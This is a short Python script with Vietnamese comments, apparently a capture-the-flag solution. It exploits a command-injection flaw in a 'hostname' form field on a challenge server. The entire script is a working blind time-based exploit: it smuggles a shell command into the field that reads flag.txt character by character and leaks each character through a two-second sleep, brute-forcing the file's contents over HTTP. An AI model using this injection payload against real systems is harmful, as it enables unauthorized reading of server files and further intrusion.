import requests
import time 

CHARSET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.{}-' # dùng để bruteforce

URL = 'http://34.130.180.82:59119/' # url của đề bài

FLAG = ''

proxies={"http":"http://127.0.0.1:8080"} #localhost

for index in range(1,50):
   print("[DEBUG] Đang bruteforce kí tự thứ ", index)
   for c in CHARSET:
       # Đây là payload exploit
       # Nếu đúng thì tui cho nó ngủ 2s
       # Nếu sai thì không ngủ
       INJECT = "; cmd=`cat flag.txt | cut -c {vitri}`; if [ $cmd = '{bruteforce}' ]; then sleep 2; else sleep 0; fi; #".format(
           vitri=index,
           bruteforce=c
       )
       # Sử dụng phương thức POST để có thể gửi dữ liệu đến url
       r = requests.post(URL, {'hostname': INJECT},proxies=proxies)
       thoi_gian_phan_hoi = r.elapsed.total_seconds()
       # Thì khi kết quả HTTP trả về, nó sẽ lưu vào .text của biến r
       #print("Tui đang thử kí tự thứ ",index," nè: ", c, "(time:",thoi_gian_phan_hoi,")")
       if thoi_gian_phan_hoi > 2:
           FLAG += c
           print("Tìm ra kí tự thứ ", index, "là ", c, "(FLAG:",FLAG,")")
           break
